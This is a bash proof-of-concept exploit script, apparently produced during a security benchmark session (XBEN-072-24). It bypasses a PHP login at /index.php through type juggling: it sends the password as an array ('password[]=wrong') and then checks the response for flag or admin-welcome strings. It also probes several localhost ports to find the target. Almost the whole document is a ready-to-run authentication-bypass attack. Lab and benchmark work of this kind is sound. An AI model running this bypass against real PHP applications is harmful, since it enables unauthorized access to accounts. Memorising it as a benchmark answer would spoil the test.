#!/bin/bash
# POC: Demonstrates type juggling authentication bypass by sending password as an array parameter to bypass password validation in /index.php with server detection
# Target: ./repo
# Created: 2025-11-07T21:39:10.833Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# Type Juggling Authentication Bypass POC
# Exploits PHP loose type comparison when password is sent as array

# Default target - can be overridden
TARGET="${1:-http://127.0.0.1:8000}"
ENDPOINT="/index.php"
FULL_URL="$TARGET$ENDPOINT"

echo "[*] Type Juggling Authentication Bypass POC"
echo "[*] Target: $FULL_URL"
echo "[*] Testing if server is accessible..."
echo ""

# Check if server is reachable
if ! curl -s -m 5 "$TARGET" > /dev/null 2>&1; then
    echo "[-] Target server not responding at $TARGET"
    echo "[*] Trying common default ports..."
    
    for port in 8080 8000 80 3000; do
        echo "[*] Trying http://127.0.0.1:$port"
        if curl -s -m 5 "http://127.0.0.1:$port" > /dev/null 2>&1; then
            TARGET="http://127.0.0.1:$port"
            FULL_URL="$TARGET$ENDPOINT"
            echo "[+] Found server at $TARGET"
            break
        fi
    done
fi

echo ""

# Step 1: Test type juggling bypass with password as array
echo "[*] Attempting type juggling bypass with password array parameter"
echo "[*] Payload: username=admin&password[]=wrong&login=Login"
echo ""

BYPASS_RESPONSE=$(curl -s -X POST \
  "$FULL_URL" \
  -d "username=admin&password[]=wrong&login=Login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w "\n%{http_code}")

# Extract HTTP status code
HTTP_CODE=$(echo "$BYPASS_RESPONSE" | tail -1)
RESPONSE_BODY=$(echo "$BYPASS_RESPONSE" | head -n -1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""
echo "[*] Response body (first 500 chars):"
echo "$RESPONSE_BODY" | head -c 500
echo ""
echo ""

# Check for success indicators
if echo "$RESPONSE_BODY" | grep -qi "congratulations.*flag\|welcome.*admin\|flag.*{"; then
    echo "[+] SUCCESS: Type juggling bypass worked!"
    echo "[+] Authentication bypassed with password array"
    echo "[+] Server returned success indicators"
    exit 0
elif echo "$RESPONSE_BODY" | grep -qi "welcome.*admin"; then
    echo "[+] SUCCESS: Admin access granted!"
    echo "[+] Type juggling bypass successful"
    exit 0
elif [ "$HTTP_CODE" = "200" ] && echo "$RESPONSE_BODY" | grep -qi "flag\|congratulations"; then
    echo "[+] SUCCESS: Bypass successful with status 200"
    exit 0
else
    echo "[-] FAILED: Bypass did not work"
    echo "[-] HTTP Code: $HTTP_CODE (expected 200)"
    echo "[-] Response did not contain success indicators"
    exit 1
fi